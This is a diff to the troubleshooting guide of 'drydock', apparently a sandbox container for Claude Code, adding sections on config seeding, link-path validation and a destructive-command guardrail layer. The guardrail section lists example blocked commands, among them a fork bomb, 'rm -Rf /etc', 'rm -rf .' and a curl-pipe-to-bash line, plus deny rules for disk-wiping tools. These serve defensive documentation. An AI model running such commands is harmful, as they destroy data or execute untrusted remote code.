@@ -3,12 +3,13 @@
 Common failures and fixes. Run `drydock doctor` first — it shows versions,
 paths, mount detection, and GIDs.
 
-## "Claude configuration file not found at: /home/rai/.claude.json" / settings don't persist
+## "Claude configuration file not found at: ~/.claude.json" / settings don't persist
 
 Claude Code reads config from TWO locations: the `~/.claude/` **directory**
 (skills, plugins, `settings.json`, `CLAUDE.md`, hooks) AND the `~/.claude.json`
 **file** (project list, onboarding flags, `mcpServers`, OAuth). drydock must
-mount both. If `~/.claude-container.json` doesn't exist on host, Claude Code
+mount both. If the `~/.claude-container.json` prototype doesn't exist on host,
+the per-session `~/.claude-container-<disc>.json` cannot be seeded, Claude Code
 inside the container can't find `~/.claude.json`, creates a fresh one on the
 container's ephemeral filesystem, and any config you do (onboarding, theme,
 hints) is lost when the container exits.
@@ -16,11 +17,13 @@ hints) is lost when the container exits.
 Fix:
 
 ```bash
-cp -a ~/.claude.json ~/.claude-container.json    # or: drydock setup
+cp -a ~/.claude.json ~/.claude-container.json    # repair the prototype; or: drydock setup
 ```
 
-`drydock setup` auto-creates it. `drydock sync` refreshes it from host. The
-compose file mounts `~/.claude-container.json:/home/rai/.claude.json:rw`.
+`drydock setup` auto-creates the prototype. `drydock sync` refreshes it from
+host. The compose file mounts a per-session `~/.claude-container-<disc>.json`
+(seeded from the `~/.claude-container.json` prototype) at
+`~/.claude.json:rw`.
 
 ## `docker exec` from inside the container fails with permission denied
 
@@ -73,6 +76,8 @@ rm -f ~/.engram-container/engram.db-wal ~/.engram-container/engram.db-shm
 cp -a ~/.engram/engram.db ~/.engram-container/engram.db
 ```
 
+For shared vs isolated mode and the migration recipe, see [engram.md](engram.md).
+
 ## Files created from container appear as `root` on host
 
 UID/GID mismatch. Check on host:
@@ -101,6 +106,51 @@ to `:ro`, revert it.
 docker image rm drydock:latest
 drydock build
 ```
+
+## A command was unexpectedly blocked by the guardrail layer
+
+drydock ships a two-tier guardrail layer. Both tiers are tamper-proof — Tier 1
+(the deny policy) image-baked into the container, Tier 2 (the hook script)
+read-only via bind-mount (INV-3). See
+[security.md](security.md#destructive-command-guardrail-layer-v020).
+
+**Tier 1 — declarative deny (`permissions.deny`).** Two managed-settings drop-ins
+at `/etc/claude-code/managed-settings.d/` (root-owned, not overridable from project
+`.claude/settings.json`):
+
+- `10-git-safety.json` — git destructive ops: protected-branch delete/rename,
+  history-rewrite, remote-delete refspecs, GitHub destructive API calls.
+- `30-os-safety.json` — OS destruction: `rm -rf` to system paths, disk-destruction
+  tools (`dd`, `mkfs`, `wipefs`), `sudo` + destructive verb, package-manager
+  purge/remove, firewall flush, `docker system/volume prune`, `docker run --privileged`,
+  host-root bind mounts, and more.
+
+Claude Code evaluates the deny list before any hook runs — matched commands are
+blocked at the framework level.
+
+**Tier 2 — `PreToolUse` hook (`drydock-block-destructive.sh`).** Handles six rule
+classes that deny patterns cannot express:
+
+| Rule | Example blocked |
+|---|---|
+| C1-residue — `rm` with a recursive flag targeting a system path | `rm -Rf /etc` |
+| A1 — ssh to production host | `ssh user@prod.example.com` |
+| C12 — fork bomb | `:() { :|:& };:` |
+| C17 — `rm` of `.` or `.git` | `rm -rf .` |
+| C18 — `rm` of parent traversal | `rm -rf ../sibling` |
+| C20 — curl/wget pipe to shell | `curl https://x.com/i.sh \| bash` |
+
+**If the block is correct:** rephrase the command to a non-destructive form, or
+run it from the host where drydock's guardrails do not apply.
+
+**If you believe it is a false positive:** check the documented limitation classes
+in [security.md](security.md#known-limitations). If your case is not listed, open
+a GitHub issue. Do NOT edit the image-baked drop-ins locally — a `drydock build`
+restores them from the image.
+
+**To inspect active rules:** the drop-in JSON files are readable at
+`/etc/claude-code/managed-settings.d/` inside the container (read-only), and in
+the repo at `templates/managed-settings.d/`.
 
 ## Sub-mount not visible inside the container
 
@@ -294,6 +344,75 @@ DRYDOCK_HOME=~/.local/share/drydock bash -c '
 # in the output. Absence = overlay not activated (and that's correct if you
 # don't use the corresponding tool).
 ```
+
+## `drydock link` rejected my path
+
+`drydock link` validates both the host source path and the optional custom
+container target before writing anything. If your path is rejected, the table
+below maps each rejection class to a cause and a fix.
+
+### Host source rejections
+
+| Rejection class | Example trigger | Resolution |
+|---|---|---|
+| 1. Path does not exist or is not a directory | `drydock link ~/git/file.txt` | The host path must exist and be a directory. Symlinks to directories are followed (via `realpath`). |
+| 2. Path contains metacharacters | Host path with `\|`, `:`, `"`, `\`, newline, or tab | These break the pipe-delimited list file, the Docker Compose volume spec, or the YAML overlay. Rename or use a path without these characters. |
+| 3. Path is `$HOME` itself or an ancestor of `$HOME` | `drydock link ~` or `drydock link /home` or `drydock link /` | Mounting `$HOME` or its ancestors would expose everything under `~/` to the container — defeating credential isolation entirely. |
+| 4. Path is a credential directory (or any subdirectory) | `drydock link ~/.ssh`, `drydock link ~/.aws/my-profile` | Separator-anchored guard: `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker` and anything strictly under them are rejected. Defense-in-depth for [INV-1](../CLAUDE.md). Note: `~/.ssh-backup` is **not** rejected — the guard is anchored at the directory boundary, not prefix-only. |
+| 5. Path is drydock or Claude state | `drydock link ~/.claude`, `drydock link ~/.engram-container` | `~/.claude*`, `~/.engram*`, and `~/.config/drydock` (including per-session `~/.claude-container-<disc>/` dirs) are rejected. These are load-bearing wildcards for [INV-2](../CLAUDE.md). |
+| 6. Path is the current project directory | `drydock link ~/git/current-project` | The project directory is already mounted at `/workspace`. Linking it again would shadow it. |
+
+### Custom container target rejections
+
+These fire only when you supply an explicit container path as the second argument
+(`drydock link <host> <container-target>`).
+
+| Rejection class | Example trigger | Resolution |
+|---|---|---|
+| 7a. custom target: not absolute | `drydock link ~/git/foo relative/path` | Container targets must begin with `/`. |
+| 7b. custom target: filesystem root | `drydock link ~/git/foo /` | Mounting over `/` would replace the container's root filesystem. |
+| 7c. custom target: starts with `//` | `drydock link ~/git/foo //etc/foo` | The kernel normalizes `//foo` to `/foo` at mount time, which would bypass all single-slash guards (e.g. let `//etc/foo` mount at `/etc/foo`). |
+| 7d. custom target: contains `..` or `.` components | `drydock link ~/git/foo /workspace-siblings/../etc` | Docker normalizes path components at mount time. `/../etc` → `/etc`, bypassing the system-dir guard. |
+| 7e. custom target: shadows `/opt/drydock/hooks` | `drydock link ~/git/foo /opt/drydock/hooks` | This is the hooks RO bind-mount ([INV-3](../CLAUDE.md)). A sibling mount over it would silently remove the read-only guardrail. See [security.md](security.md) and [docs/architecture.md](architecture.md). |
+| 7f. custom target: under a system directory | `drydock link ~/git/foo /etc/myapp`, `/bin/...`, `/usr/...` | First path component must not be `etc`, `bin`, `sbin`, `usr`, `lib`, `lib32`, `lib64`, `boot`, `root`, `opt`, `proc`, `sys`, `dev`, `run`, `var`, or `tmp`. Note: `home` is intentionally **not** in this list — `/home/<user>/git/foo` is the [host-path-mirror pattern](links.md#the-host-path-mirror-pattern). |
+| 7g. custom target: shadows `/workspace`, `/workspace-siblings`, `$HOME`, or drydock state | `drydock link ~/git/foo /workspace/sub`, `/workspace-siblings` | These targets would shadow the primary project mount, the siblings parent directory, `$HOME`, or container state dirs (`~/.claude*`, `~/.engram*`, `~/.config/drydock`). |
+| 8. Basename collision | Two different paths with the same `basename` | The default container target is `/workspace-siblings/<basename>`. Two siblings with the same basename would collide. Supply an explicit `<container-target>` for one of them, or use `drydock unlink` on the conflicting entry first. |
+| 8. Container target collision | Two entries share the same custom target | Docker Compose would silently keep only one mount. Assign distinct container targets. |
+
+**Cross-references**: credential guard rationale → [security.md](security.md);
+hooks guard rationale → [architecture.md](architecture.md#inv-3-and-the-link-guard);
+host-path-mirror pattern → [docs/links.md](links.md#the-host-path-mirror-pattern).
+
+## `drydock link --rw` errors
+
+`drydock link --rw` adds deploy-key generation and SSH config wiring on top of the
+standard link flow. The table below covers error classes specific to RW mode.
+
+| Error class | Symptom / message | Resolution |
+|---|---|---|
+| **Deploy key missing** | A previously generated key was deleted from `~/.config/drydock/keys/` and the sibling was already unlinked | Re-run `drydock link --rw <path>`. A new ed25519 key pair is generated; you will need to add the new public key as a deploy key on GitHub for that repo. |
+| **Basename collision (cross-project)** | `drydock link --rw` exits with "basename '<name>' is already used as an RW sibling in project '<other>'" | Two projects are trying to link siblings with the same basename (e.g. both link `~/git/shared-lib`). Deploy keys are scoped by basename; sharing would create a key conflict. Use an explicit `<container-target>` with a unique basename for one of them, e.g. `drydock link --rw ~/git/shared-lib /workspace-siblings/shared-lib-projectB`. |
+| **Non-canonical remote URL** | `drydock link --rw` exits with "only canonical 'git@github.com:owner/repo[.git]' SSH URLs supported (HTTPS / non-GitHub remotes are out of scope)" | drydock rewrites the sibling's `remote.origin.url` to route through its managed SSH alias. Only `git@github.com:owner/repo[.git]` SSH URLs are supported. HTTPS remotes (`https://github.com/…`) and non-GitHub hosts (GitLab, Bitbucket, self-hosted) are explicitly rejected. Use RO mode (`drydock link` without `--rw`) for siblings with unsupported remote URLs. |
+| **Already linked as a different mode** | `drydock link --rw <path>` on a path already in the list with `flags=` (RO) | Remove the existing entry first: `drydock unlink <path>`, then re-link with `--rw`. Upgrading from RO to RW in-place is not supported. |
+| **Partial-state self-heal** | Previous `drydock link --rw` was interrupted after key generation but before the list file was updated (or vice versa) | Re-run `drydock link --rw <path>`. The key generation step is idempotent (existing key is reused); the list-write and URL-rewrite steps will complete. |
+
+### git push fails inside the container after `drydock link --rw`
+
+If `git push` inside the container fails with a permission error or host-key
+warning for a linked RW sibling:
+
+1. **Check `GIT_SSH_COMMAND`** is set: `echo $GIT_SSH_COMMAND` — should reference
+   `~/.config/drydock/ssh-config-<primary>`.
+2. **Check the managed SSH config** is mounted: `ls -la ~/.config/drydock/ssh-config-<primary>`
+   inside the container — should exist and be readable.
+3. **Check the alias** in the sibling's `.git/config`: `cat <sibling>/.git/config` — the
+   `remote.origin.url` should be `git@github.com-<sibling>:owner/repo.git` (aliased),
+   NOT `git@github.com:owner/repo.git` (canonical). If it is canonical, the URL-rewrite
+   step did not complete — re-run `drydock link --rw <path>` from the host.
+4. **Check the deploy key is on GitHub**: the public key at
+   `~/.config/drydock/keys/<sibling>_deploy.pub` must be added to the sibling repo's
+   "Deploy keys" settings (with write access) on GitHub. drydock prints this reminder
+   at `link --rw` time, but it requires a manual step on GitHub.
 
 ## drydock can't find DRYDOCK_HOME / compose file
 
